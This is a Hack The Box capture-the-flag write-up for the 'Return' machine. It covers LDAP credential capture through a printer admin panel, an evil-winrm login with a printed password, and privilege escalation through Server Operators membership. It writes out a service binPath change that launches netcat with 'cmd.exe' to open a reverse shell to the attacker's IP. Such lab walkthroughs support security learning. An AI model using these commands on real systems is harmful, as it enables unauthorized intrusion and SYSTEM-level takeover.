---
description: https://app.hackthebox.com/machines/Return
---

# ☄️ Return

<figure><img src="../../.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

We first see this nmap output:

<figure><img src="../../.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

On the webpage we can see a printer admin panel ->

<figure><img src="../../.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

With settings that seem to be vulnerable:

<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

Inspect element did not work on the password field so i set up a listener on port 389, modify the hostname and hit update button ->

<figure><img src="../../.gitbook/assets/image (1013).png" alt=""><figcaption></figcaption></figure>

With a quick evil-winrm we can get a shell ->

```
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
```

and get a flag

Now the enumeration part is looking at the privileges of the account and what groups is he a part of ->

```
whoami /all    
```

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/" %}

<figure><img src="../../.gitbook/assets/image (1014).png" alt=""><figcaption></figcaption></figure>

So i follow the methodology of the documentation and put netcat on the target machine ->

```
upload /usr/share/sqlninja/apps/nc.exe
```

{% hint style="info" %}
we replace the service binary with netcatthen it will give us a reverse shell as a system user because the service is starting as a system on the compromised host.
{% endhint %}

```
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.58 1234"
```

{% hint style="info" %}
Then we will stop the service and start it again. So, this time when service starts, it will execute the binary that we have set in set earlier.
{% endhint %}

```
sc.exe start VMTools
nc -nlvp 1234 //on local machine
sc.exe stop VMTools
```

and obtain a shell as system

<figure><img src="../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

explanation of the SC command:

* **`sc.exe`**:
  * This is the Service Control utility in Windows, used for communicating with the Service Control Manager and services.
* **`config`**:
  * This argument specifies that you are changing the configuration of a service.
* **`VMTools`**:
  * The name of the service you are configuring. In this case, "VMTools".
* **`binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.58 1234"`**:
  * This parameter sets the executable path and arguments that the service will run.
  * **`C:\Users\svc-printer\Desktop\nc.exe`**: Specifies the path to the executable, which is `nc.exe` (Netcat).
  * **`-e cmd.exe`**: An option for Netcat to execute a specified program (`cmd.exe`) after establishing a connection.
  * **`10.10.14.58 1234`**: The IP address and port to which Netcat will connect. In this example, it connects to `10.10.14.58` on port `1234`.
* This command changes the executable path of the "VMTools" service to run `nc.exe` (Netcat) instead of its original executable.
* **Remote Shell**: The `nc.exe -e cmd.exe 10.10.14.58 1234` part tells Netcat to open a command shell (`cmd.exe`) and send it to the specified IP address and port.
* **Backdoor**: This effectively turns the "VMTools" service into a backdoor, allowing an attacker to connect to the machine remotely and gain command line access.

<figure><img src="../../.gitbook/assets/image (1016).png" alt=""><figcaption></figcaption></figure>
